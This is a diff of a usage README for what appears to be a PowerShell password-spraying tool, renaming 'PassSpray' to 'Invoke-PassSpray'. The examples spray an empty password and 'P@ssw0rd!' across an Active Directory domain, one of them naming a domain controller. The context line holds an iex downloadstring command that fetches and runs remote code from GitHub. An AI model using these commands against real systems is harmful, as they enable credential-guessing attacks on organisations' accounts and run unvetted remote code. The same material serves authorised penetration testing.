@@ -10,15 +10,15 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 
 ### Spray Empty password
 ```
-PassSpray
+Invoke-PassSpray
 ```
 
 ### Spray a password across the Domain
 ```
-PassSpray -Password P@ssw0rd!
+Invoke-PassSpray -Password P@ssw0rd!
 ```
 
 ### Spray a password across the Domain - Specify Domain and DC
 ```
-PassSpray -Password P@ssw0rd! -Domain ferrari.local -DomainController DC01.ferrari.local
+Invoke-PassSpray -Password P@ssw0rd! -Domain ferrari.local -DomainController DC01.ferrari.local
 ```
